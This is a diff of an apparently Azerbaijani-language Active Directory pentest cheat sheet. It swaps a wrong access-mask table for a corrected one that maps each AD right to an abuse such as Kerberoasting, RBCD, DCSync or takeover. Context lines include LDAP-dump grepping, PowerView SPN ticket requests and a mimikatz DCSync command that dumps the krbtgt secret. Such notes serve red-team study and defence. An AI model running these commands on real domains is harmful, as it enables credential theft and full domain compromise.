@@ -43,16 +43,24 @@ grep -r "GenericAll\|WriteDacl" /tmp/ldapdump/
 ## ACL Rights Mask-ları və Abuse Metodları
 ```
 
-0x100	             | DELETE	Object sil	Remove-ADObject
-0x20000	           | WRITE_DAC	ACL dəyişdir (WriteDacl)	Set-DomainObjectAcl
-0x400	             | WRITE_OWNER	Owner dəyiş (Takeover)	Set-DomainObjectOwner
-0x10	             | GENERIC_ALL	BÜTÜN rights (DCSync, ResetPass)	DCSync ilə dump
-0x2	               | GENERIC_WRITE	AddMember, ResetPassword	Add-DomainGroupMember
-0x8	               | GENERIC_EXECUTE	Read potensialı	Enum yalnız
-0x1000f            | DS_READ_PROP	Properties oxu	Enum
-0x40000000000000	 | DS_CONTROL_ACCESS (DCSync)	NTDS dump	secretsdump.py
+0x00000001  | CreateChild        | Alt obyekt yaratmaq (user/computer/OU creation, RBCD üçün machine account)
+0x00000002  | DeleteChild        | Child obyekt silmək (DoS, GPO və ya admin hesabı silmək)
+0x00000004  | ListChildren       | Child obyektləri görmək (Recon)
+0x00000008  | Self               | Validated writes (məs. müəyyən hallarda SPN və ya xüsusi atribut dəyişiklikləri)
+0x00000010  | ReadProperty       | Atributları oxumaq (SPN, LAPS, delegation info)
+0x00000020  | WriteProperty      | Atribut dəyişmək (SPN add → targeted Kerberoast, RBCD, group member mod)
+0x00000040  | DeleteTree         | Subtree silmək (struktur DoS)
+0x00000080  | ListObject         | Gizli obyektləri görmək (Advanced recon)
+0x00000100  | ExtendedRight      | Xüsusi hüquqlar (ResetPassword, DCSync – GUID-dən asılıdır)
+0x00010000  | Delete             | Obyekti silmək (Admin hesabı / GPO silmək)
+0x00020000  | ReadControl        | Security descriptor oxumaq (ACL recon)
+0x00040000  | WriteDacl          | ACL dəyişmək (özünə hüquq əlavə edərək privilege escalation)
+0x00080000  | WriteOwner         | Owner dəyişmək (takeover → sonra WriteDacl ilə full control)
+0x10000000  | GenericAll         | Full control (ResetPass, ACL change, DCSync, persistence)
+0x20000000  | GenericExecute     | Məhdud icra hüquqları (praktik eskalasiya nadir)
+0x40000000  | GenericWrite       | Bir çox atributa write (SPN add → Kerberoasting, group takeover, RBCD)
+0x80000000  | GenericRead        | Geniş oxuma hüququ (Kerberoast recon, LAPS read əgər qorunmayıbsa)
 
-GenericAll Abuse (0x100 + 0x10 = DCSync)
 # DCSync icazəsi ilə NTDS dump
 Get-DomainUser -Identity targetuser | Get-DomainSPNTicket  # Önce test
 mimikatz.exe "lsadump::dcsync /domain:domain.com /user:krbtgt" exit
